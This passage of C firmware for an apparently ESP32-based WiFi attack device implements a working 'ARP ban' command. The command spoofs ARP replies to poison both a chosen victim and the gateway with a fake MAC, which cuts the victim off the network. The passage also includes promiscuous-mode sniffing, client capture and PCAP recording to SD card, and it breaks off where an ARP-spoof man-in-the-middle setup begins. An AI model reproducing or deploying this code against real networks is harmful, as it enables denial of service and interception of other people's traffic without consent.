                           uint32_t sender_ip,          // ARP sender IP (spoofed)
                           const uint8_t *target_mac,   // ARP target MAC
                           uint32_t target_ip) {        // ARP target IP
    
    uint8_t arp_packet[ARP_PACKET_SIZE];
    
    // Ethernet header (14 bytes)
    memcpy(&arp_packet[0], dst_mac, 6);              // Destination MAC
    memcpy(&arp_packet[6], src_mac, 6);              // Source MAC (fake)
    arp_packet[12] = (ETH_TYPE_ARP >> 8) & 0xFF;     // EtherType ARP (0x0806)
    arp_packet[13] = ETH_TYPE_ARP & 0xFF;
    
    // ARP header (28 bytes)
    arp_packet[14] = (ARP_HWTYPE_ETH >> 8) & 0xFF;   // Hardware type: Ethernet (1)
    arp_packet[15] = ARP_HWTYPE_ETH & 0xFF;
    arp_packet[16] = (ARP_PROTO_IP >> 8) & 0xFF;     // Protocol type: IPv4 (0x0800)
    arp_packet[17] = ARP_PROTO_IP & 0xFF;
    arp_packet[18] = 6;                               // Hardware address length
    arp_packet[19] = 4;                               // Protocol address length
    arp_packet[20] = (ARP_OP_REPLY >> 8) & 0xFF;     // Operation: ARP Reply (2)
    arp_packet[21] = ARP_OP_REPLY & 0xFF;
    
    // Sender hardware address (fake MAC)
    memcpy(&arp_packet[22], sender_mac, 6);
    
    // Sender protocol address (spoofed IP)
    arp_packet[28] = sender_ip & 0xFF;
    arp_packet[29] = (sender_ip >> 8) & 0xFF;
    arp_packet[30] = (sender_ip >> 16) & 0xFF;
    arp_packet[31] = (sender_ip >> 24) & 0xFF;
    
    // Target hardware address
    memcpy(&arp_packet[32], target_mac, 6);
    
    // Target protocol address
    arp_packet[38] = target_ip & 0xFF;
    arp_packet[39] = (target_ip >> 8) & 0xFF;
    arp_packet[40] = (target_ip >> 16) & 0xFF;
    arp_packet[41] = (target_ip >> 24) & 0xFF;
    
    // Allocate pbuf and send
    struct pbuf *p = pbuf_alloc(PBUF_RAW, ARP_PACKET_SIZE, PBUF_RAM);
    if (p != NULL) {
        memcpy(p->payload, arp_packet, ARP_PACKET_SIZE);
        lwip_netif->linkoutput(lwip_netif, p);
        pbuf_free(p);
    }
}

static void arp_ban_task(void *pvParameters) {
    (void)pvParameters;
    
    // Get netif
    esp_netif_t *sta_netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (!sta_netif) {
        MY_LOG_INFO(TAG, "ARP ban: STA netif not found");
        arp_ban_task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }
    
    struct netif *lwip_netif = esp_netif_get_netif_impl(sta_netif);
    if (!lwip_netif) {
        MY_LOG_INFO(TAG, "ARP ban: LwIP netif not found");
        arp_ban_task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }
    
    if (!lwip_netif->linkoutput) {
        MY_LOG_INFO(TAG, "ARP ban: netif has no linkoutput function");
        arp_ban_task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }
    
    // Fake MAC (non-existent address to break connectivity)
    uint8_t fake_mac[6] = { 0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0x00 };
    
    MY_LOG_INFO(TAG, "ARP ban: Poisoning both victim and router");
    uint32_t arp_cycle = 0;
    
    while (arp_ban_active) {
        // Packet 1: To VICTIM - "Gateway IP is at fake MAC"
        send_arp_reply(lwip_netif,
                       arp_ban_target_mac,       // Eth dst: victim
                       fake_mac,                  // Eth src: fake
                       fake_mac,                  // ARP sender MAC: fake
                       arp_ban_gateway_ip.addr,   // ARP sender IP: gateway (spoofed!)
                       arp_ban_target_mac,        // ARP target MAC: victim
                       arp_ban_target_ip.addr);   // ARP target IP: victim
        
        vTaskDelay(pdMS_TO_TICKS(50));  // Small delay between packets
        
        // Packet 2: To ROUTER - "Victim IP is at fake MAC"
        send_arp_reply(lwip_netif,
                       arp_ban_gateway_mac,       // Eth dst: router
                       fake_mac,                  // Eth src: fake
                       fake_mac,                  // ARP sender MAC: fake
                       arp_ban_target_ip.addr,    // ARP sender IP: victim (spoofed!)
                       arp_ban_gateway_mac,       // ARP target MAC: router
                       arp_ban_gateway_ip.addr);  // ARP target IP: router
        
        arp_cycle++;
        if (arp_cycle % 4 == 0) {
            char arp_l2[64], arp_l3[64], arp_l4[64];
            snprintf(arp_l2, sizeof(arp_l2), "  %02X:%02X:%02X:%02X",
                     arp_ban_target_mac[2], arp_ban_target_mac[3],
                     arp_ban_target_mac[4], arp_ban_target_mac[5]);
            snprintf(arp_l3, sizeof(arp_l3), "  %d.%d.%d.%d",
                     ip4_addr1(&arp_ban_target_ip), ip4_addr2(&arp_ban_target_ip),
                     ip4_addr3(&arp_ban_target_ip), ip4_addr4(&arp_ban_target_ip));
            snprintf(arp_l4, sizeof(arp_l4), "  Poison #%lu", (unsigned long)arp_cycle);
            oled_display_update_full("> ARP Ban", arp_l2, arp_l3, arp_l4);
        }
        
        vTaskDelay(pdMS_TO_TICKS(450)); // Total ~500ms cycle
    }
    
    MY_LOG_INFO(TAG, "ARP ban task stopped");
    arp_ban_task_handle = NULL;
    vTaskDelete(NULL);
}

static int cmd_arp_ban(int argc, char **argv) {
    oled_display_update_full("> ARP Ban",
        argc >= 2 ? argv[1] : "  No MAC",
        "  Poison active", "  Blocking...");
    if (argc < 2) {
        MY_LOG_INFO(TAG, "Usage: arp_ban <MAC> [IP]");
        MY_LOG_INFO(TAG, "Example: arp_ban AA:BB:CC:DD:EE:FF 192.168.1.50");
        MY_LOG_INFO(TAG, "If IP is omitted, it will be looked up from ARP table.");
        return 1;
    }
    
    // Check if already running
    if (arp_ban_active || arp_ban_task_handle != NULL) {
        MY_LOG_INFO(TAG, "ARP ban already running. Use 'stop' first.");
        return 1;
    }
    
    // Check if connected to AP
    wifi_ap_record_t ap_info;
    if (esp_wifi_sta_get_ap_info(&ap_info) != ESP_OK) {
        MY_LOG_INFO(TAG, "Not connected to any AP. Use 'wifi_connect' first.");
        return 1;
    }
    
    // Parse MAC address
    if (!parse_mac_address(argv[1], arp_ban_target_mac)) {
        MY_LOG_INFO(TAG, "Invalid MAC format. Use AA:BB:CC:DD:EE:FF");
        return 1;
    }
    
    // Parse optional IP or try to find it in ARP table
    if (argc >= 3) {
        uint32_t ip = esp_ip4addr_aton(argv[2]);
        if (ip == 0) {
            MY_LOG_INFO(TAG, "Invalid IP address: %s", argv[2]);
            return 1;
        }
        arp_ban_target_ip.addr = ip;
    } else {
        // Try to find IP from ARP table
        bool found = false;
        for (int i = 0; i < ARP_TABLE_SIZE; i++) {
            ip4_addr_t *ip_ret;
            struct netif *netif_ret;
            struct eth_addr *eth_ret;
            if (etharp_get_entry(i, &ip_ret, &netif_ret, &eth_ret) == 1) {
                if (memcmp(eth_ret->addr, arp_ban_target_mac, 6) == 0) {
                    arp_ban_target_ip.addr = ip_ret->addr;
                    found = true;
                    MY_LOG_INFO(TAG, "Found IP %d.%d.%d.%d for target MAC",
                               ip4_addr1(ip_ret), ip4_addr2(ip_ret), 
                               ip4_addr3(ip_ret), ip4_addr4(ip_ret));
                    break;
                }
            }
        }
        if (!found) {
            MY_LOG_INFO(TAG, "MAC not found in ARP table. Run 'list_hosts' first or specify IP.");
            return 1;
        }
    }
    
    // Get gateway info
    esp_netif_t *sta_netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    esp_netif_ip_info_t ip_info;
    esp_netif_get_ip_info(sta_netif, &ip_info);
    
    // Store gateway IP
    arp_ban_gateway_ip.addr = ip_info.gw.addr;
    
    // Find gateway MAC from ARP table
    bool gateway_found = false;
    for (int i = 0; i < ARP_TABLE_SIZE; i++) {
        ip4_addr_t *ip_ret;
        struct netif *netif_ret;
        struct eth_addr *eth_ret;
        if (etharp_get_entry(i, &ip_ret, &netif_ret, &eth_ret) == 1) {
            if (ip_ret->addr == ip_info.gw.addr) {
                memcpy(arp_ban_gateway_mac, eth_ret->addr, 6);
                gateway_found = true;
                break;
            }
        }
    }
    
    if (!gateway_found) {
        // Gateway not in ARP table - send ARP request to get it
        MY_LOG_INFO(TAG, "Gateway MAC not in ARP table, sending ARP request...");
        struct netif *lwip_netif = esp_netif_get_netif_impl(sta_netif);
        if (lwip_netif) {
            ip4_addr_t gw_ip = { .addr = ip_info.gw.addr };
            etharp_request(lwip_netif, &gw_ip);
            vTaskDelay(pdMS_TO_TICKS(1000)); // Wait for response
            
            // Try again
            for (int i = 0; i < ARP_TABLE_SIZE; i++) {
                ip4_addr_t *ip_ret;
                struct netif *netif_ret;
                struct eth_addr *eth_ret;
                if (etharp_get_entry(i, &ip_ret, &netif_ret, &eth_ret) == 1) {
                    if (ip_ret->addr == ip_info.gw.addr) {
                        memcpy(arp_ban_gateway_mac, eth_ret->addr, 6);
                        gateway_found = true;
                        break;
                    }
                }
            }
        }
        
        if (!gateway_found) {
            MY_LOG_INFO(TAG, "Could not find gateway MAC. Make sure you're connected to the network.");
            return 1;
        }
    }
    
    MY_LOG_INFO(TAG, "Starting ARP ban attack (bidirectional):");
    MY_LOG_INFO(TAG, "  Target MAC: %02X:%02X:%02X:%02X:%02X:%02X",
               arp_ban_target_mac[0], arp_ban_target_mac[1], arp_ban_target_mac[2],
               arp_ban_target_mac[3], arp_ban_target_mac[4], arp_ban_target_mac[5]);
    MY_LOG_INFO(TAG, "  Target IP: %d.%d.%d.%d",
               ip4_addr1(&arp_ban_target_ip), ip4_addr2(&arp_ban_target_ip),
               ip4_addr3(&arp_ban_target_ip), ip4_addr4(&arp_ban_target_ip));
    MY_LOG_INFO(TAG, "  Gateway MAC: %02X:%02X:%02X:%02X:%02X:%02X",
               arp_ban_gateway_mac[0], arp_ban_gateway_mac[1], arp_ban_gateway_mac[2],
               arp_ban_gateway_mac[3], arp_ban_gateway_mac[4], arp_ban_gateway_mac[5]);
    MY_LOG_INFO(TAG, "  Gateway IP: " IPSTR, IP2STR(&ip_info.gw));
    MY_LOG_INFO(TAG, "  Attack: Poisoning BOTH victim and router");
    
    // Start attack task
    arp_ban_active = true;
    BaseType_t result = xTaskCreate(arp_ban_task, "arp_ban", 4096, NULL, 5, &arp_ban_task_handle);
    if (result != pdPASS) {
        MY_LOG_INFO(TAG, "Failed to create ARP ban task");
        arp_ban_active = false;
        return 1;
    }
    
    MY_LOG_INFO(TAG, "ARP ban started. Use 'stop' to stop.");
    return 0;
}

static void packet_monitor_shutdown(void) {
    if (packet_monitor_promiscuous_owned) {
        esp_wifi_set_promiscuous(false);
        packet_monitor_promiscuous_owned = false;
    }

    if (packet_monitor_callback_installed) {
        esp_wifi_set_promiscuous_rx_cb(NULL);
        packet_monitor_callback_installed = false;
    }

    if (packet_monitor_has_prev_channel) {
        esp_wifi_set_channel(packet_monitor_prev_primary, packet_monitor_prev_secondary);
        packet_monitor_has_prev_channel = false;
    }
}

static void packet_monitor_stop(void) {
    if (!packet_monitor_active && packet_monitor_task_handle == NULL && !packet_monitor_promiscuous_owned && !packet_monitor_callback_installed) {
        return;
    }

    MY_LOG_INFO(TAG, "Stopping packet monitor...");

    packet_monitor_active = false;

    for (int i = 0; i < 40 && packet_monitor_task_handle != NULL; ++i) {
        vTaskDelay(pdMS_TO_TICKS(50));
    }

    if (packet_monitor_task_handle != NULL) {
        vTaskDelete(packet_monitor_task_handle);
        packet_monitor_task_handle = NULL;
    }

    packet_monitor_shutdown();
    packet_monitor_total = 0;
}

static void packet_monitor_promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
    (void)buf;

    if (!packet_monitor_active) {
        return;
    }

    packet_monitor_total++;
}

static void packet_monitor_task(void *pvParameters) {
    (void)pvParameters;

    uint32_t last_total = 0;

    while (packet_monitor_active) {
        vTaskDelay(pdMS_TO_TICKS(1000));

        if (!packet_monitor_active) {
            break;
        }

        uint32_t current = packet_monitor_total;
        uint32_t diff = current - last_total;
        last_total = current;

        printf("%" PRIu32 "pkts\n", diff);
        fflush(stdout);
        
        {
            char pm_l3[64], pm_l4[64];
            snprintf(pm_l3, sizeof(pm_l3), "  %" PRIu32 " pkts/sec", diff);
            snprintf(pm_l4, sizeof(pm_l4), "  Total: %" PRIu32, current);
            oled_display_update_full("> Pkt Monitor", "  Listening...", pm_l3, pm_l4);
        }
    }

    packet_monitor_shutdown();
    packet_monitor_task_handle = NULL;
    packet_monitor_total = 0;
    packet_monitor_active = false;
    vTaskDelete(NULL);
}

static int cmd_packet_monitor(int argc, char **argv) {
    {
        char oled_ch[24];
        snprintf(oled_ch, sizeof(oled_ch), "  Channel %s", argc >= 2 ? argv[1] : "?");
        oled_display_update_full("> Pkt Monitor", oled_ch, "", "  Listening...");
    }
    log_memory_info("packet_monitor");
    
    // Ensure WiFi is initialized
    if (!ensure_wifi_mode()) {
        return 1;
    }
    
    if (argc < 2) {
        MY_LOG_INFO(TAG, "Usage: packet_monitor <channel>");
        return 1;
    }

    if (packet_monitor_active || packet_monitor_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Packet monitor already active. Use 'stop' to stop it first.");
        return 1;
    }

    char *endptr = NULL;
    long channel = strtol(argv[1], &endptr, 10);
    if (argv[1][0] == '\0' || (endptr != NULL && *endptr != '\0')) {
        MY_LOG_INFO(TAG, "Invalid channel argument. Usage: packet_monitor <channel>");
        return 1;
    }

    if (channel < 1 || channel > 165) {
        MY_LOG_INFO(TAG, "Channel must be between 1 and 165.");
        return 1;
    }

    if (sniffer_active || sniffer_scan_phase || sniffer_dog_active) {
        MY_LOG_INFO(TAG, "Sniffer is active. Use 'stop' to stop it first.");
        return 1;
    }

    if (applicationState != IDLE) {
        MY_LOG_INFO(TAG, "Another attack is active. Use 'stop' to stop it first.");
        return 1;
    }

    if (wardrive_active) {
        MY_LOG_INFO(TAG, "Wardrive is active. Use 'stop' to stop it first.");
        return 1;
    }

    if (portal_active) {
        MY_LOG_INFO(TAG, "Portal is active. Use 'stop' to stop it first.");
        return 1;
    }

    esp_err_t err;
    uint8_t primary = 1;
    wifi_second_chan_t secondary = WIFI_SECOND_CHAN_NONE;
    err = esp_wifi_get_channel(&primary, &secondary);
    if (err == ESP_OK) {
        packet_monitor_prev_primary = primary;
        packet_monitor_prev_secondary = secondary;
        packet_monitor_has_prev_channel = true;
    } else {
        packet_monitor_has_prev_channel = false;
    }

    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT |
                       WIFI_PROMIS_FILTER_MASK_DATA |
                       WIFI_PROMIS_FILTER_MASK_CTRL
    };

    esp_wifi_set_promiscuous(false);

    err = esp_wifi_set_promiscuous_filter(&filter);
    if (err != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to set promiscuous filter: %s", esp_err_to_name(err));
        packet_monitor_shutdown();
        return 1;
    }

    err = esp_wifi_set_channel((uint8_t)channel, WIFI_SECOND_CHAN_NONE);
    if (err != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to set channel %ld: %s", channel, esp_err_to_name(err));
        packet_monitor_shutdown();
        return 1;
    }

    err = esp_wifi_set_promiscuous_rx_cb(packet_monitor_promiscuous_callback);
    if (err != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to set promiscuous callback: %s", esp_err_to_name(err));
        packet_monitor_shutdown();
        return 1;
    }
    packet_monitor_callback_installed = true;

    packet_monitor_total = 0;
    packet_monitor_active = true;

    err = esp_wifi_set_promiscuous(true);
    if (err != ESP_OK) {
        packet_monitor_active = false;
        MY_LOG_INFO(TAG, "Failed to enable promiscuous mode: %s", esp_err_to_name(err));
        packet_monitor_shutdown();
        return 1;
    }
    packet_monitor_promiscuous_owned = true;

    BaseType_t task_ok = xTaskCreate(
        packet_monitor_task,
        "packet_monitor",
        2048,
        NULL,
        5,
        &packet_monitor_task_handle
    );

    if (task_ok != pdPASS) {
        packet_monitor_active = false;
        packet_monitor_task_handle = NULL;
        MY_LOG_INFO(TAG, "Failed to create packet monitor task.");
        packet_monitor_shutdown();
        return 1;
    }

    MY_LOG_INFO(TAG, "Packet monitor started on channel %ld. Type 'stop' to stop.", channel);

    esp_err_t led_err = led_set_color(255, 255, 255); // White for packet monitor
    if (led_err != ESP_OK) {
        ESP_LOGW(TAG, "Failed to set LED for packet monitor: %s", esp_err_to_name(led_err));
    }
    return 0;
}

static void channel_view_publish_counts(void) {
    uint16_t counts24[CHANNEL_VIEW_24GHZ_CHANNEL_COUNT] = {0};
    uint16_t counts5[CHANNEL_VIEW_5GHZ_CHANNEL_COUNT] = {0};

    for (uint16_t i = 0; i < g_scan_count; ++i) {
        const wifi_ap_record_t *ap = &g_scan_results[i];
        uint8_t primary = ap->primary;
        if (primary >= 1 && primary <= 14) {
            counts24[primary - 1]++;
        } else {
            for (size_t idx = 0; idx < CHANNEL_VIEW_5GHZ_CHANNEL_COUNT; ++idx) {
                if (channel_view_5ghz_channels[idx] == primary) {
                    counts5[idx]++;
                    break;
                }
            }
        }
    }

    MY_LOG_INFO(TAG, "channel_view_start");
    MY_LOG_INFO(TAG, "band:24");
    for (size_t i = 0; i < CHANNEL_VIEW_24GHZ_CHANNEL_COUNT; ++i) {
        MY_LOG_INFO(TAG, "ch%u:%u", channel_view_24ghz_channels[i], counts24[i]);
    }
    MY_LOG_INFO(TAG, "band:5");
    for (size_t i = 0; i < CHANNEL_VIEW_5GHZ_CHANNEL_COUNT; ++i) {
        MY_LOG_INFO(TAG, "ch%u:%u", channel_view_5ghz_channels[i], counts5[i]);
    }
    MY_LOG_INFO(TAG, "channel_view_end");
}

static void channel_view_task(void *pvParameters) {
    (void)pvParameters;

    const TickType_t scan_delay = pdMS_TO_TICKS(CHANNEL_VIEW_SCAN_DELAY_MS);
    const TickType_t wait_slice = pdMS_TO_TICKS(100);

    int cv_scan_num = 0;
    
    while (channel_view_active && !operation_stop_requested) {
        oled_display_update_full("> Channel View", "  Scanning...", "  All channels", "  Analyzing...");
        
        esp_err_t err = start_background_scan(FAST_SCAN_MIN_TIME, FAST_SCAN_MAX_TIME);
        if (err != ESP_OK) {
            MY_LOG_INFO(TAG, "channel_view_error:scan_start %s", esp_err_to_name(err));
            break;
        }

        int wait_iterations = 0;
        while (channel_view_active && g_scan_in_progress &&
               wait_iterations < CHANNEL_VIEW_SCAN_TIMEOUT_ITERATIONS) {
            vTaskDelay(wait_slice);
            wait_iterations++;
        }

        if (!channel_view_active || operation_stop_requested) {
            break;
        }

        if (g_scan_in_progress) {
            MY_LOG_INFO(TAG, "channel_view_error:timeout");
            esp_wifi_scan_stop();
        } else {
            channel_view_publish_counts();
            cv_scan_num++;
            
            // Find busiest channel
            int busiest_ch = 0, busiest_count = 0;
            for (uint16_t ci = 0; ci < g_scan_count; ci++) {
                int ch = g_scan_results[ci].primary;
                int cnt = 0;
                for (uint16_t cj = 0; cj < g_scan_count; cj++) {
                    if (g_scan_results[cj].primary == ch) cnt++;
                }
                if (cnt > busiest_count) { busiest_count = cnt; busiest_ch = ch; }
            }
            
            char cv_l2[64], cv_l3[64], cv_l4[64];
            snprintf(cv_l2, sizeof(cv_l2), "  Found %d APs", g_scan_count);
            snprintf(cv_l3, sizeof(cv_l3), "  Busy: Ch%d (%d)", busiest_ch, busiest_count);
            snprintf(cv_l4, sizeof(cv_l4), "  Scan #%d", cv_scan_num);
            oled_display_update_full("> Channel View", cv_l2, cv_l3, cv_l4);
        }

        if (!channel_view_active || operation_stop_requested) {
            break;
        }

        vTaskDelay(scan_delay);
    }

    channel_view_scan_mode = false;
    channel_view_active = false;
    channel_view_task_handle = NULL;
    esp_err_t led_err = led_set_idle();
    if (led_err != ESP_OK) {
        ESP_LOGW(TAG, "Failed to restore LED after channel view: %s", esp_err_to_name(led_err));
    }
    MY_LOG_INFO(TAG, "Channel view monitor stopped.");
    vTaskDelete(NULL);
}

static void channel_view_stop(void) {
    if (!channel_view_active && channel_view_task_handle == NULL && !channel_view_scan_mode) {
        return;
    }

    channel_view_active = false;
    if (channel_view_scan_mode && g_scan_in_progress) {
        esp_wifi_scan_stop();
    }

    for (int i = 0; i < 40 && channel_view_task_handle != NULL; ++i) {
        vTaskDelay(pdMS_TO_TICKS(50));
    }

    if (channel_view_task_handle != NULL) {
        vTaskDelete(channel_view_task_handle);
        channel_view_task_handle = NULL;
    }

    channel_view_scan_mode = false;
    MY_LOG_INFO(TAG, "Channel view stopped.");
}

static int cmd_channel_view(int argc, char **argv) {
    (void)argc;
    (void)argv;
    oled_display_update_full("> Channel View", "  WiFi spectrum", "  All channels", "  Analyzing...");
    log_memory_info("channel_view");

    // Ensure WiFi is initialized
    if (!ensure_wifi_mode()) {
        return 1;
    }

    if (channel_view_active || channel_view_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Channel view already running. Use 'stop' to stop it first.");
        return 1;
    }

    if (packet_monitor_active || packet_monitor_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Packet monitor is active. Use 'stop' before starting channel view.");
        return 1;
    }

    if (sniffer_active || sniffer_scan_phase || sniffer_dog_active) {
        MY_LOG_INFO(TAG, "Sniffer operations are active. Use 'stop' before starting channel view.");
        return 1;
    }

    if (wardrive_active) {
        MY_LOG_INFO(TAG, "Wardrive is active. Use 'stop' before starting channel view.");
        return 1;
    }

    if (portal_active) {
        MY_LOG_INFO(TAG, "Portal is active. Use 'stop' before starting channel view.");
        return 1;
    }

    if (applicationState != IDLE) {
        MY_LOG_INFO(TAG, "Another attack is active. Use 'stop' before starting channel view.");
        return 1;
    }

    if (g_scan_in_progress) {
        MY_LOG_INFO(TAG, "Scan already in progress. Wait for it to finish or use 'stop'.");
        return 1;
    }

    operation_stop_requested = false;
    channel_view_active = true;
    channel_view_scan_mode = true;
    BaseType_t task_ok =
        xTaskCreate(channel_view_task, "channel_view", 4096, NULL, 5, &channel_view_task_handle);

    if (task_ok != pdPASS) {
        channel_view_active = false;
        channel_view_scan_mode = false;
        channel_view_task_handle = NULL;
        MY_LOG_INFO(TAG, "Failed to create channel view task.");
        return 1;
    }

    esp_err_t led_err = led_set_color(128, 0, 255); // purple-ish to indicate analyzer
    if (led_err != ESP_OK) {
        ESP_LOGW(TAG, "Failed to set LED for channel view: %s", esp_err_to_name(led_err));
    }

    MY_LOG_INFO(TAG, "Channel view started. Type 'stop' to stop it.");
    return 0;
}

static int cmd_start_sniffer(int argc, char **argv) {
    (void)argc; (void)argv;
    {
        char oled_target[48];
        if (g_selected_count > 0 && g_scan_done) {
            oled_build_target_summary(oled_target, sizeof(oled_target));
        } else {
            snprintf(oled_target, sizeof(oled_target), "  All networks");
        }
        oled_display_update_full("> Sniffer", oled_target, "  Promiscuous", "  Capturing...");
    }
    log_memory_info("start_sniffer");
    
    // Ensure WiFi is initialized
    if (!ensure_wifi_mode()) {
        return 1;
    }
    
    // Reset stop flag at the beginning of operation
    operation_stop_requested = false;
    
    if (sniffer_active) {
        MY_LOG_INFO(TAG, "Sniffer already active. Use 'stop' to stop it first.");
        return 1;
    }
    
    // Note: Sniffer results are preserved between sessions. Use 'clear_sniffer_results' to clear them.
    
    // Check if networks were selected
    if (g_selected_count > 0 && g_scan_done) {
        // Selected networks mode - skip scan, use selected networks only
        MY_LOG_INFO(TAG, "Starting sniffer in SELECTED NETWORKS mode...");
        MY_LOG_INFO(TAG, "Will monitor %d pre-selected network(s)", g_selected_count);
        
        sniffer_active = true;
        sniffer_scan_phase = false; // Skip scan phase
        sniffer_selected_mode = true;
        
        // Initialize sniffer with selected networks
        sniffer_init_selected_networks();
        
        if (sniffer_ap_count == 0 || sniffer_selected_channels_count == 0) {
            MY_LOG_INFO(TAG, "Failed to initialize selected networks for sniffer");
            sniffer_active = false;
            sniffer_selected_mode = false;
            return 1;
        }
        
        // Set LED to green for active sniffing
        esp_err_t led_err = led_set_color(0, 255, 0); // Green
        if (led_err != ESP_OK) {
            ESP_LOGW(TAG, "Failed to set LED for sniffer: %s", esp_err_to_name(led_err));
        }
        
        // Set promiscuous filter
        esp_wifi_set_promiscuous_filter(&sniffer_filter);
        
        // Enable promiscuous mode
        esp_wifi_set_promiscuous_rx_cb(sniffer_promiscuous_callback);
        esp_wifi_set_promiscuous(true);
        
        // Initialize channel hopping with selected channels
        sniffer_channel_index = 0;
        sniffer_current_channel = sniffer_selected_channels[0];
        sniffer_last_channel_hop = esp_timer_get_time() / 1000;
        esp_wifi_set_channel(sniffer_current_channel, WIFI_SECOND_CHAN_NONE);
        
        // Start channel hopping task
        if (sniffer_channel_task_handle == NULL) {
            xTaskCreate(sniffer_channel_task, "sniffer_channel", 2048, NULL, 5, &sniffer_channel_task_handle);
            MY_LOG_INFO(TAG, "Started sniffer channel hopping task");
        }
        
        MY_LOG_INFO(TAG, "Sniffer: Now monitoring selected networks (no scan performed)");
        MY_LOG_INFO(TAG, "Use 'show_sniffer_results' to see captured clients or 'stop' to stop.");
        
    } else {
        // Normal mode - scan all networks
        MY_LOG_INFO(TAG, "Starting sniffer in NORMAL mode (scanning all networks)...");
        
        sniffer_active = true;
        sniffer_scan_phase = true;
        sniffer_selected_mode = false;
        
        // Set LED (ignore errors if LED is in invalid state)
        esp_err_t led_err = led_set_color(255, 255, 0); // Yellow
        if (led_err != ESP_OK) {
            ESP_LOGW(TAG, "Failed to set LED for sniffer: %s", esp_err_to_name(led_err));
        }
        
        esp_err_t err = start_background_scan(FAST_SCAN_MIN_TIME, FAST_SCAN_MAX_TIME);
        if (err != ESP_OK) {
            sniffer_active = false;
            sniffer_scan_phase = false;
            sniffer_selected_mode = false;
            
            // Return LED to idle (ignore errors if LED is in invalid state)
            led_err = led_set_idle();
            if (led_err != ESP_OK) {
                ESP_LOGW(TAG, "Failed to restore idle LED after sniffer failure: %s", esp_err_to_name(led_err));
            }
            
            MY_LOG_INFO(TAG, "Failed to start scan for sniffer: %s", esp_err_to_name(err));
            return 1;
        }
        
        MY_LOG_INFO(TAG, "Sniffer started - scanning networks...");
        MY_LOG_INFO(TAG, "Use 'show_sniffer_results' to see captured clients or 'stop' to stop.");
    }
    
    return 0;
}

static int cmd_start_pcap(int argc, char **argv) {
    pcap_capture_mode_t mode = PCAP_MODE_RADIO;

    if (argc >= 2) {
        if (strcasecmp(argv[1], "net") == 0) {
            mode = PCAP_MODE_NET;
        } else if (strcasecmp(argv[1], "radio") == 0) {
            mode = PCAP_MODE_RADIO;
        } else {
            MY_LOG_INFO(TAG, "Usage: start_pcap radio|net");
            return 1;
        }
    }

    if (pcap_capture_active) {
        MY_LOG_INFO(TAG, "PCAP capture already active. Use 'stop' first.");
        return 1;
    }

    operation_stop_requested = false;

    if (mode == PCAP_MODE_NET) {
        wifi_ap_record_t ap_info;
        if (esp_wifi_sta_get_ap_info(&ap_info) != ESP_OK) {
            MY_LOG_INFO(TAG, "Not connected to WiFi. Use 'wifi_connect' first.");
            return 1;
        }
    }

    if (mode == PCAP_MODE_RADIO) {
        if (!ensure_wifi_mode()) {
            MY_LOG_INFO(TAG, "Failed to initialize WiFi for radio capture.");
            return 1;
        }
    }

    esp_err_t ret = init_sd_card();
    if (ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to initialize SD card: %s", esp_err_to_name(ret));
        return 1;
    }

    struct stat st;
    if (stat("/sdcard/lab/pcaps", &st) != 0) {
        if (mkdir("/sdcard/lab/pcaps", 0755) != 0) {
            MY_LOG_INFO(TAG, "Failed to create /sdcard/lab/pcaps directory");
            return 1;
        }
        sd_sync();
    }

    int file_num = find_next_pcap_file_number();
    snprintf(pcap_capture_filepath, sizeof(pcap_capture_filepath),
             "/sdcard/lab/pcaps/sniff_%d.pcap", file_num);

    pcap_capture_file = fopen(pcap_capture_filepath, "wb");
    if (!pcap_capture_file) {
        MY_LOG_INFO(TAG, "Failed to open %s for writing", pcap_capture_filepath);
        return 1;
    }

    uint32_t linktype = (mode == PCAP_MODE_RADIO) ? 105 : 1;
    pcap_global_header_t ghdr = {
        .magic_number = 0xa1b2c3d4,
        .version_major = 2,
        .version_minor = 4,
        .thiszone = 0,
        .sigfigs = 0,
        .snaplen = 65535,
        .network = linktype
    };
    fwrite(&ghdr, 1, sizeof(ghdr), pcap_capture_file);
    fflush(pcap_capture_file);

    pcap_capture_frame_count = 0;
    pcap_capture_drop_count = 0;

    pcap_packet_queue = xQueueCreate(256, sizeof(pcap_queued_frame_t *));
    if (!pcap_packet_queue) {
        MY_LOG_INFO(TAG, "Failed to create PCAP packet queue");
        fclose(pcap_capture_file);
        pcap_capture_file = NULL;
        return 1;
    }

    pcap_capture_mode = mode;
    pcap_capture_active = true;

    xTaskCreate(pcap_writer_task, "pcap_writer", 4096, NULL, 5, &pcap_writer_task_handle);

    if (mode == PCAP_MODE_RADIO) {
        wifi_promiscuous_filter_t filter = {
            .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT |
                           WIFI_PROMIS_FILTER_MASK_DATA |
                           WIFI_PROMIS_FILTER_MASK_CTRL
        };
        esp_wifi_set_promiscuous_filter(&filter);
        esp_wifi_set_promiscuous_rx_cb(pcap_radio_promiscuous_cb);
        esp_wifi_set_promiscuous(true);

        oled_display_update_full("> PCAP Radio", "  Promiscuous", "  Capturing...", pcap_capture_filepath + 18);
        MY_LOG_INFO(TAG, "PCAP radio capture started -> %s", pcap_capture_filepath);
    } else {
        esp_netif_t *sta_netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
        if (!sta_netif) {
            MY_LOG_INFO(TAG, "Failed to get STA netif");
            pcap_capture_active = false;
            fclose(pcap_capture_file);
            pcap_capture_file = NULL;
            vQueueDelete(pcap_packet_queue);
            pcap_packet_queue = NULL;
            return 1;
        }

        struct netif *lwip_nif = (struct netif *)esp_netif_get_netif_impl(sta_netif);
        if (!lwip_nif) {
            MY_LOG_INFO(TAG, "Failed to get lwIP netif");
            pcap_capture_active = false;
            fclose(pcap_capture_file);
            pcap_capture_file = NULL;
            vQueueDelete(pcap_packet_queue);
            pcap_packet_queue = NULL;
            return 1;
        }

        // --- ARP spoof MITM setup ---
